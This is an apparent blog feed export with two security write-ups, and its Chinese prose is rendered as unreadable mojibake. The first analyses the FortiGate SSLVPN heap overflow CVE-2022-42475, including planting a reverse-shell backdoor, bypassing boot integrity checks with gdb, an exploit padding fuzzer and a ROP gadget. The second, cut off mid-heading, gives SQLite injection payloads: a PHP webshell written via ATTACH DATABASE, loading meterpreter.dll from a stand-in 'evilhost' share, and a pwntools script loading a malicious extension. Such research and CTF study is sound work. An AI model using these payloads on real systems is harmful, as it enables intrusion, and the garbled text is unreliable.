      <url>CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>åŸæ–‡é“¾æ¥ï¼š<a href="https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html">https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html</a></p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>è¿™ä¸¤å¤©å’Œ @leommxj ä¸€èµ·åˆ†æäº†å’Œå†™äº†ä¸€ä¸‹  CVE-2023-27997 çš„æ¼æ´åˆ©ç”¨ï¼Œ é¡ºä¾¿ä¸€æƒ³æƒ³ CVE-2022-42475 è¿™ä¸ªæ¼æ´ä¹Ÿè¿‡å»è›®ä¹…çš„äº†ï¼Œäºæ˜¯å‡†å¤‡æŠŠè¿™ç¯‡ CVE-2022-42475 æ¼æ´åˆ†æåˆ†äº«å‡ºæ¥ã€‚æ³¨ï¼šæœ¬æ–‡ä¸å«å®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ã€‚</p><p>ä¸‹å›¾ä¸º CVE-2023-27997  çš„åˆ©ç”¨å½•å±ï¼Œ ä¸æœ¬æ–‡è¦è®²çš„ CVE-2022-42475  æ— å…³</p><blockquote class="twitter-tweet"><p lang="en" dir="ltr">I learned a lot from <a href="https://twitter.com/cfreal_?ref_src=twsrc%5Etfw">@cfreal_</a> , and it&#39;s great to write exploits together with <a href="https://twitter.com/leommxj?ref_src=twsrc%5Etfw">@leommxj</a>.<a href="https://twitter.com/hashtag/CVE?src=hash&amp;ref_src=twsrc%5Etfw">#CVE</a>-2023-27997 <a href="https://t.co/nEFndgvoVD">pic.twitter.com/nEFndgvoVD</a></p>&mdash; swing (@bestswngs) <a href="https://twitter.com/bestswngs/status/1669969165392953344?ref_src=twsrc%5Etfw">June 17, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>æ³¨ï¼šè¿™ç¯‡ç¬”è®°æˆæ–‡äº 2023-02-28 ï¼Œ å‘è¡¨äº 2023-06-18</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>2022 å¹´ 12 æœˆ 12 æ—¥ï¼ŒFortinet å®˜æ–¹å‘å¸ƒäº†å½±å“ FortiGate SSLVPN çš„ RCE æ¼æ´ CVE-2022-42475 ç›¸å…³ä¿¡æ¯ã€‚æœ¬æ–‡å¯¹æ­¤æ¼æ´çš„æˆå› è¿›è¡Œåˆ†æã€‚</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>æµ‹è¯•ç‰ˆæœ¬ä¸º 7.2.2ï¼Œ ç¯å¢ƒçš„å®‰è£…å’Œéƒ¨ç½²å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š  <a href="https://blog.csdn.net/meigang2012/article/details/87903878%E3%80%82">https://blog.csdn.net/meigang2012/article/details/87903878ã€‚</a> å¦å¤–æ„Ÿè°¢ä¸‹ @explorer ç½‘ç®¡å¤§å“¥åœ¨éƒ¨ç½²ç¯å¢ƒä¸Šçš„å¸®åŠ©ã€‚</p><p>å¯¼å…¥è™šæ‹Ÿæœºåéœ€è¦é…ç½®ä¸‹ç½‘ç»œï¼Œ å‚è€ƒ <a href="https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1">https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1</a></p><p>æœ‰ä¸ªé‡ç‚¹ dns è¦è®¾ç½®ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config system dns</span><br><span class="line"><span class="built_in">set</span> primary &lt;Primary DNS server&gt;</span><br><span class="line"><span class="built_in">set</span> secondary &lt;Secondary DNS server&gt;</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment"># The default DNS servers are 208.91.112.53 and 208.91.112.52.</span></span><br></pre></td></tr></table></figure><p>éœ€è¦é…ç½®ä¸€ä¸ª sslvpn ï¼Œç„¶åèƒ½è®¿é—®å³å¯ã€‚</p><h2 id="è®¾å¤‡æƒé™è·å–"><a href="#è®¾å¤‡æƒé™è·å–" class="headerlink" title="è®¾å¤‡æƒé™è·å–"></a>è®¾å¤‡æƒé™è·å–</h2><p>æŒ‚è½½è™šæ‹Ÿæœº vmdk ç¡¬ç›˜åï¼Œ å¯ä»¥çœ‹åˆ°æœ‰ä¸ª rootfs.gz æ–‡ä»¶ã€‚ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Jas-22:/home/user/Desktop/fuck-fortigate/rootfs<span class="comment"># ls</span></span><br><span class="line">bin  bin.tar.xz  boot  data  data2  dev  etc  fortidev  init  lib  lib64  migadmin.tar.xz  node-scripts.tar.xz  proc  sbin  sys  tmp  usr  usr.tar.xz  usr.tar.xz.chk  var</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰å¦‚ä¸‹å†…å®¹ï¼Œ æˆ‘ä»¬éœ€è¦è¿›ä¸€æ­¥è§£å‹  <code>bin.tar.xz</code> æ–‡ä»¶å¤¹ï¼Œä½¿ç”¨ sbin ç›®å½•è‡ªå¸¦çš„å‘½ä»¤è§£å‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chroot . /sbin/xz --check=sha256 -d /bin.tar.xz</span><br><span class="line">chroot . /sbin/ftar -xf /bin.tar</span><br><span class="line">chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz</span><br><span class="line">chroot . /sbin/ftar -xf /migadmin.tar</span><br></pre></td></tr></table></figure><p>ç„¶åéœ€è¦åœ¨ bin ç›®å½•ä¸­æ”¾å…¥åé—¨ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç”Ÿæˆä¸€ä¸ªåå¼¹shellæ›¿æ¢  smartctl æ–‡ä»¶ï¼Œ ä»¥åŠæˆ‘è¿™é‡Œæ”¾å…¥ä¸€ä¸ª busybox ï¼Œåšä¸€ä¸ªè½¯é“¾æ¥ <code>ln -sn /bin/busybox bin/sh</code> è®¾å¤‡ä¸­é»˜è®¤æ²¡æœ‰  bash ï¼ˆshï¼‰æ–‡ä»¶ ï¼ˆæˆ–è€…è¯´ä»–çš„ sh åŠŸèƒ½æ¯”è¾ƒé¸¡è‚‹ï¼‰ï¼Œ ç„¶åé‡æ–°æ‰“åŒ…ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡æ–°æ‰“åŒ… bin æ–‡ä»¶å¤¹</span></span><br><span class="line">chroot . sbin/ftar -cf bin.tar bin</span><br><span class="line">chroot . sbin/xz --check=sha256 -e bin.tar</span><br><span class="line"><span class="comment"># é‡æ–°æ‰“åŒ… rootfs</span></span><br><span class="line">find . | cpio -H newc -o &gt; ../rootfs.raw</span><br><span class="line">cat ./rootfs.raw | gzip &gt; rootfs.gz</span><br></pre></td></tr></table></figure><p>é‡æ‰“åŒ…å®Œæˆåï¼Œ æˆ‘ä»¬éœ€è¦è¿‡å‡ ä¸ªæ ¡éªŒï¼Œæ‰èƒ½æ­£å¸¸å¯åŠ¨ç³»ç»Ÿã€‚</p><p>vmlinux ï¼š </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-6dbab4847a64cb84dff1b31c4e8e49b1-302eb4.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-6dbab4847a64cb84dff1b31c4e8e49b1-302eb4.png"></a></p><p>è§£ä¸‹æ¥æ˜¯ bin/initï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-c887601385826f00ca523269f2551e12-419102.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-c887601385826f00ca523269f2551e12-419102.png"></a></p><p>è¿™é‡Œä¼šæ ¡éªŒ fgtsum ï¼Œ å¤±è´¥ç›´æ¥ç»™ä½ é‡å¯æœ€åæ˜¯ rootfs æ£€æŸ¥</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-b76899fa4e7c4c68e04166ca06b38b05-3f7506.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-b76899fa4e7c4c68e04166ca06b38b05-3f7506.png"></a></p><p>ç”±äºï¼Œæˆ‘æ˜¯é‡‡ç”¨ vmware +  gdb çš„è°ƒè¯•æ–¹å¼ï¼Œ å³ <a href="https://bestwing.me/Linux_Kernel_Debugging_with_VMware_and_GDB.html">ä½¿ç”¨VMwareå’ŒGDBè¿›è¡ŒLinuxå†…æ ¸è°ƒè¯• (bestwing.me)</a>ï¼Œ å› æ­¤æˆ‘ç›´æ¥å†™äº†ä¸€ä¸ª gdb python è„šæœ¬åŠ¨æ€ä¿®æ”¹è¿”å›å€¼å³å¯ï¼š</p><blockquote><p>è¿™é‡Œçš®ä¸€å¥ï¼Œä¾ç¨€è®°å¾—è¿™æ®µä»£ç æ˜¯ chatGPT å¸®æˆ‘ç”Ÿæˆçš„ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SetRaxBreakpoint</span>(<span class="params">gdb.Breakpoint</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, bp_expr, rax_value, temporary=False</span>):</span></span><br><span class="line">        gdb.Breakpoint.__init__(self, bp_expr, gdb.BP_BREAKPOINT, <span class="literal">False</span>, temporary )</span><br><span class="line">        <span class="comment"># super(SetRaxBreakpoint, self).__init__(spec, temporary)</span></span><br><span class="line">        self.rax_value = rax_value</span><br><span class="line">        self.silent = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span>(<span class="params">self</span>):</span></span><br><span class="line">        gdb.execute(<span class="string">&#x27;set $rax = &#123;&#125;&#x27;</span>.format(self.rax_value))</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&#x27;set architecture i386:x86-64&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;set pagination off&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r1 = SetRaxBreakpoint(<span class="string">&#x27;*0xffffffff807ac11c&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">r2 = SetRaxBreakpoint(<span class="string">&#x27;*0x4518C9&#x27;</span>, <span class="number">1</span>) <span class="comment"># </span></span><br><span class="line">r3 = SetRaxBreakpoint(<span class="string">&#x27;*0x277fccc&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>å½“ç³»ç»ŸæˆåŠŸæ‰§è¡Œåï¼Œä½¿ç”¨ <code>diagnose hardware smartctl </code> å³å¯è¿è¡Œæˆ‘ä»¬çš„åé—¨æ–‡ä»¶ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>åœ¨å¤„ç†ç”¨æˆ· POST æ•°æ®çš„æ—¶å€™ï¼Œ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-f8922630b29d5da26852daf138d53568-c35f78.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-f8922630b29d5da26852daf138d53568-c35f78.png"></a></p><p>ä¼šæ ¹æ® http header ä¸­çš„  <code>content-length</code>å­—æ®µåˆ†é… buffer ï¼Œ ç„¶è€Œåœ¨åˆ†é…ä¹‹å‰ï¼Œ å³åœ¨è°ƒç”¨ pool_alloc å‡½æ•°ä¹‹å‰</p><blockquote><p> pool_alloc æœ‰ä¸¤ä¸ªå‚æ•°,  ç¬¬äºŒä¸ªä¸ºå³å°†è¦åˆ†é…çš„buffer å¤§å°</p></blockquote><p>rax ä¸ºç”¨æˆ·è¯·æ±‚ç»“æ„ä½“æŒ‡é’ˆï¼Œåç§»ä½ç½® 0x18 å­˜æ”¾äº† CL å€¼ã€‚å…ˆå°† CL æ”¾åœ¨ eax å¯„å­˜å™¨ä¸­ï¼Œä½¿ç”¨ lea æŒ‡ä»¤å°†å…¶åŠ ä¸€åæ”¾åœ¨ esi å¯„å­˜å™¨ï¼Œå†ç”¨ movsxd æ‰©å±•ä¸º 64 bit å€¼ã€‚</p><p>åœ¨è°ƒç”¨ pool_alloc å‡½æ•°æ—¶ä½¿ç”¨ 32 ä½æ•°å€¼ + 1 æ‹“å±•æˆ 64 ä½çš„æ–¹æ³•ï¼Œè¿™é‡Œå­˜åœ¨æ•´æ•°æº¢å‡ºã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ç‰¹æ®Šçš„ CL å€¼ï¼Œæ¯”å¦‚ 0x1b00000000ï¼Œç»è¿‡è¿ç®—æ‹“å±•ä¹‹åä¼šå˜æˆ 0x1 ã€‚ä¼šåˆ†é…ä¸€ä¸ªå°çš„å†…å­˜ç©ºé—´å¯¼è‡´æº¢å‡º</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-128350f0bec9a51748ab3b63b116a7ce-981162.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-128350f0bec9a51748ab3b63b116a7ce-981162.png"></a></p><p>ä¸Šé¢è¿™ä¸ªæ˜¯æ–­ç‚¹æ˜¯åˆå§‹åŒ– buffer ï¼Œ å¯ä»¥çœ‹åˆ°å¤§å°æ˜¯ 1,  ä¹‹ååœ¨ memcpy å¤„å°± ä¼šæº¢å‡ºã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-6b4a0c20901bb1fb02d0126a5149423b-28adec.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-6b4a0c20901bb1fb02d0126a5149423b-28adec.png"></a></p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>è¿™é‡Œé¦–å…ˆæ˜ç¡®ä¸€ä¸‹ï¼Œæˆ‘ä¸ä¼šå…¬å¼€å®Œæ•´çš„åˆ©ç”¨ï¼Œè¿™é‡Œè¿™æä¸€ç‚¹åˆ©ç”¨ä¸Šçš„æ€è·¯ã€‚åˆ©ç”¨æ•´ä½“æ€è·¯å‚è€ƒ Orange 2017 å¹´çš„æ–‡ç« ï¼Œ å¤§è‡´æ€è·¯å°±æ˜¯è¿›è¡Œè¿›è¡Œç«äº‰ï¼Œ ä¸€è¾¹åœ¨å †ä¸Šå¸ƒå±€ SSL ç»“æ„ä½“ï¼Œä¸€è¾¹è§¦å‘æ¼æ´ï¼Œç„¶åæº¢å‡ºè¦†ç›– SSL ç»“æ„ä½“ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-da548c387796e997639b84cc9298d0d2-3fc09e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-da548c387796e997639b84cc9298d0d2-3fc09e.png"></a></p><p>ä¹‹åå°±å¯ä»¥æ§åˆ¶ PC ï¼Œ å½“æˆ‘ä»¬æ§åˆ¶ PC åæˆ‘ä»¬éœ€è¦ç¡®å®š padding ï¼Œ è¿™ä¸ªæ­¥éª¤æ¯”è¾ƒç¹çï¼Œ æˆ‘æ‹¿ PoC æ”¹äº†ä¸€ä¸ªå¾ªç¯ fuzz çš„è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_exploit</span>(<span class="params">padding</span>):</span></span><br><span class="line"> ...</span><br><span class="line"> payload = p64(ret) * padding + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x1000</span></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">123</span>, <span class="number">384</span>):</span><br><span class="line">    padding = int(i )</span><br><span class="line">    <span class="keyword">if</span> do_exploit(padding):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;timeout ...&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹ ret è¿™ä¸ªgadget ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œ å½“è§¦å‘æ–­ç‚¹çš„æ—¶å€™ï¼Œ è„šæœ¬ä¼šå› ä¸ºtimeout  è§¦å‘å¼‚å¸¸ï¼Œç„¶åè¿™é™„è¿‘å¤§æ¦‚å°±æ˜¯å’±ä»¬çš„paddingã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-4f7aaf1a3306a4fe035b064f9bcd4e21-284979.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-4f7aaf1a3306a4fe035b064f9bcd4e21-284979.png"></a></p><p>ç„¶åè¿™ä¸ªæ—¶å€™åªéœ€è¦æ‰¾æ ˆè¿ç§»çš„gadget å³å¯ã€‚è¿™é‡Œæˆ‘æ‰¾äº†çš„ <code> push rdx ; add bl, byte ptr [rbx + 0x41] ; pop rsp ; pop rbp ; ret</code> ï¼Œ è¿™ä¸ªgadget ï¼Œ æ­£å¥½å¯ä»¥å°†æ ˆè¿ç§»åˆ°  rdi å¯„å­˜å™¨æ‰€æŒ‡å‘çš„å†…å­˜åœ°å€ä¸Šã€‚ç„¶åå°†å‰©ä¸‹ ret æŒ‡ä»¤çš„æ›¿æ¢æˆ <code>pop rax ; ret</code><br>è¿™æ ·çš„gadgetï¼Œ è¿™æ ·å°±èƒ½ä¸€ç›´è¿ç§»åˆ°å¯æ§åˆ¶çš„ <code>AAAAAAA</code> çš„åœ°æ–¹è¿›è¡Œ rop é“¾äº†ã€‚</p><blockquote><p>å†é˜…è¯»è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹ï¼Œæˆ‘çªç„¶ååº”è¿‡æ¥å…¶å®ä¸éœ€è¦æ›¿æ¢æŒ‡ä»¤ï¼Œ å½“å‰çš„ ret æŒ‡ä»¤å°±è¶³å¤Ÿè¿ç§»åˆ°å¯æ§çš„ <code>AAAA</code> çš„ä½ç½®è¿›è¡Œ ROP äº†</p></blockquote><p>ç”±äº fortigate çš„è¿™ä¸ªç¨‹åºå¾ˆå¤§ï¼Œæ­£å¦‚ <a href="https://twitter.com/hashtag/CVE?src=hashtag_click">CVE</a>-2023-27997 çš„ä½œè€…æ‰€è¯´çš„ï¼Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-18-052405000e893e38eafc4cdbda2afe2c-4a9f3b.png" title="image-20230618171021882" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-18-052405000e893e38eafc4cdbda2afe2c-4a9f3b.png" alt="image-20230618171021882"></a></p><p>è¯¥ç¨‹åºå¾ˆå¤§ï¼Œæƒ³æ‰¾åˆ°é€‚åˆçš„ gadget æ¥ç»„æˆ ropchain ä»…ä»…éœ€è¦èŠ±è´¹ä¸€ç‚¹æ—¶é—´å°±è¡Œäº†ã€‚</p><h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://blog.csdn.net/meigang2012/article/details/87903878">é£å¡”è€æ¢…å­çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1">Configuring port 1 | FortiGate Private Cloud 7.2.0 (fortinet.com)</a></p><p><a href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/">attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</a></p><p><a href="https://bestwing.me/Linux_Kernel_Debugging_with_VMware_and_GDB.html">ä½¿ç”¨VMwareå’ŒGDBè¿›è¡ŒLinuxå†…æ ¸è°ƒè¯• (bestwing.me)</a></p><p><a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">CVE-2022-42475 | CataLpaâ€™s Site (wzt.ac.cn)</a></p><p><a href="https://www.cnblogs.com/studyskill/p/6524672.html">fortios 5.4åé—¨æ¤å…¥</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2022-42475 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»JustCTF 2023 ä¸­å­¦åˆ°çš„ä¸€ç‚¹å…³äº sqlite3 ä»£ç æ‰§è¡Œçš„æ–¹æ³•</title>
      <link href="How-to-hacked-sqlite.html"/>
      <url>How-to-hacked-sqlite.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h1><p>å‘¨æœ«ç®€å•çœ‹äº†ä¸‹ JustCTF 2023 çš„é¢˜ç›®ï¼Œ ä¸»è¦æ˜¯ä¸‰ä¸ªé¢˜ç›®å¸å¼•äº†æˆ‘çš„æ³¨æ„ï¼Œ åˆ†åˆ«æ˜¯ notabug ã€notabug2 å’ŒWindytoothã€‚ å…¶ä¸­å‰é¢ä¸¤ä¸ªæ˜¯å’Œ sqlite3 ç›¸å…³çš„é¢˜ç›®ã€‚å†æ¬¡å­¦åˆ°äº†ä¸€ç‚¹åˆ©ç”¨æ–¹å¼ã€‚</p><h3 id="Known-Attacks-on-SQLite"><a href="#Known-Attacks-on-SQLite" class="headerlink" title="Known Attacks on SQLite"></a>Known Attacks on SQLite</h3><p>åœ¨BlackHat 2017 é•¿äº­ç§‘æŠ€çš„ slide ä¸­æåˆ°ä¸¤ç§ä¼—æ‰€å‘¨çŸ¥çš„æ–¹æ³•ï¼š <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">^1</a></p><h4 id="Attach-Database"><a href="#Attach-Database" class="headerlink" title="Attach Database"></a>Attach Database</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;bob&#39;; ATTACH DATABASE &#39;&#x2F;var&#x2F;www&#x2F;lol.php&#39; AS lol; CREATE TABLE lol.pwn </span><br><span class="line">(dataz text); INSERT INTO lol.pwn (dataz) VALUES (&#39;&lt;? system($_GET[&#39;cmd&#39;]); </span><br><span class="line">?&gt;&#39;;--</span><br></pre></td></tr></table></figure><p>é€šè¿‡å†™ <code>ATTACH DATABASE</code> å†™æ–‡ä»¶ï¼Œ ç„¶åæ‰§è¡Œ php ä»£ç </p><h4 id="SELECT-load-extension"><a href="#SELECT-load-extension" class="headerlink" title="SELECT load_extension"></a>SELECT load_extension</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;123 UNION SELECT </span><br><span class="line">1,load_extension(&#39;\\evilhost\evilshare\meterpreter.dll&#39;,&#39;DllMain&#39;);--</span><br></pre></td></tr></table></figure><p>åœ¨èƒ½ä¸Šä¼ æ–‡ä»¶çš„æƒ…å†µåœ¨ï¼Œ ä¸”åŠ è½½æ‰©å±•çš„åŠŸèƒ½å¿…é¡»æ‰“å¼€ <a href="https://www.sqlite.org/c3ref/load_extension.html">^2</a> ã€‚åœ¨ JustCTF çš„ notabug ä¸­ä¹Ÿç”¨åˆ°è¿™ä¸ªæŠ€å·§</p><figure class="highlight python"><figcaption><span>title: "exploit for notabug (JustCTF 2023)"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = remote(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">13337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;CREATE TABLE images(name TEXT, type TEXT, img BLOB);&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;./exp.so&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dt = f.read()</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;INSERT INTO images(name,type,img)&quot;</span>)</span><br><span class="line"></span><br><span class="line">dt = binascii.hexlify(dt)</span><br><span class="line"><span class="comment"># warning(chr(dt[1]))</span></span><br><span class="line"></span><br><span class="line">print(dt.decode())</span><br><span class="line"><span class="comment"># input()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">f&quot;VALUES(&#x27;icon&#x27;,&#x27;jpeg&#x27;,cast(x&#x27;<span class="subst">&#123;dt.decode()&#125;</span>&#x27; as text));&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;SELECT writefile(&#x27;./exp.so&#x27;,img) FROM images WHERE name=&#x27;icon&#x27;;&quot;</span>)</span><br><span class="line"><span class="comment"># print(hex(int(p.readline())))</span></span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;./exp&#x27;,&#x27;exp&#x27;);&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="learned-from-JustCTF"><a href="#learned-from-JustCTF" class="headerlink" title="learned from JustCTF"></a>learned from 